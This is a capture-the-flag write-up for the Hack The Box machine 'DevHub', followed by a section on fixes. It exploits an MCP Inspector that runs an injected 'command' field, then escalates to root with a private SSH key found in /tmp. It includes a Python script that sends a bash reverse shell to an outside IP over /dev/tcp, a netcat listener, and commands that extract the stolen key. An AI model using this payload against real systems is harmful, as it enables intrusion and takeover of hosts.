## Summary

DevHub is a Medium Linux machine hosting an internal development platform. An
**MCP Inspector** instance on port 6274 parses server configurations insecurely,
executing the `command` field and yielding a reverse shell as `analyst`. A
world-readable `/tmp/opsdump.json` contains root's private SSH key, which is used
to log in directly as **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| DevHub | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH (22) and HTTP (80).
2. Web enumeration shows the DevHub platform with three services.
3. MCP Inspector is identified on port 6274.
4. The MCP protocol parser is vulnerable to code injection.
5. RCE provides a foothold as `analyst`.
6. `/tmp/opsdump.json` exposes root's private SSH key.
7. SSH as root with the recovered key.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.1.108
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80 | HTTP | nginx 1.18.0, title "DevHub" |

The host was added to `/etc/hosts` as `devhub.htb`.

## Web Enumeration

`http://devhub.htb` presented the **DevHub** "Internal Development & Analytics
Platform" with three services:

- **MCP Inspector** — active on port 6274 (MCP development/debugging tool)
- **Analytics Dashboard** — internal only, `localhost:8888` (Jupyter)
- **Code Repository** — internal Git server, in maintenance mode

The MCP Inspector was the most promising vector.

## Exploitation — MCP Protocol Parsing

The MCP Inspector (`http://devhub.htb:6274`) processes MCP server configurations
via an HTTP POST. The parser executed the `command` field without sanitization,
enabling code injection.

A malicious server configuration was sent to `/mcp/add`:

```python
import requests

target = "http://devhub.htb:6274"
payload = {
    "name": "test",
    "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.116/4444 0>&1'",
}

response = requests.post(f"{target}/mcp/add", json=payload)
print(response.text)
```

## Initial Access (User)

A listener received the reverse shell as `analyst`.

```bash
nc -vnlp 4444
```

```
uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),4(adm)
```

The user flag lives at `/home/analyst/user.txt`.

## Privilege Escalation

### Enumeration

Searching the filesystem revealed a sensitive file in `/tmp`:

```bash
find / -name "*opsdump*" 2>/dev/null
# /tmp/opsdump.json
```

The file contained root's private SSH key in plaintext.

```bash
python3 -c "import json; print(json.load(open('/tmp/opsdump.json'))['root_private_key'])" > /tmp/root_key
chmod 600 /tmp/root_key
```

### SSH as root

The recovered key allowed a direct login as root.

```bash
ssh -i /tmp/root_key root@10.129.1.108
```

```
uid=0(root) gid=0(root) groups=0(root)
```

The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**MCP protocol parsing — code execution** — the MCP Inspector executed the
`command` field from a server configuration via `subprocess` without validation,
giving unauthenticated RCE as `analyst`. Fix: never execute user-supplied command
fields, authenticate the inspector, and restrict it to localhost.

**Insecure credential storage** — root's private SSH key was stored in plaintext
in the world-readable `/tmp/opsdump.json`, allowing direct escalation to root.
Fix: never write private keys to world-readable locations, restrict file
permissions, and rotate exposed keys.

## Tools Used

- Nmap
- curl
- Netcat
- Python 3
- SSH

## Key Takeaways

- Lesser-known protocols (like MCP) can ship parsers with critical injection bugs.
- `/tmp` is a frequent credential dumping ground; always enumerate it after a foothold.
- Internal DevOps tooling is often less hardened than user-facing applications.
- Found SSH keys should be tested against all known users.
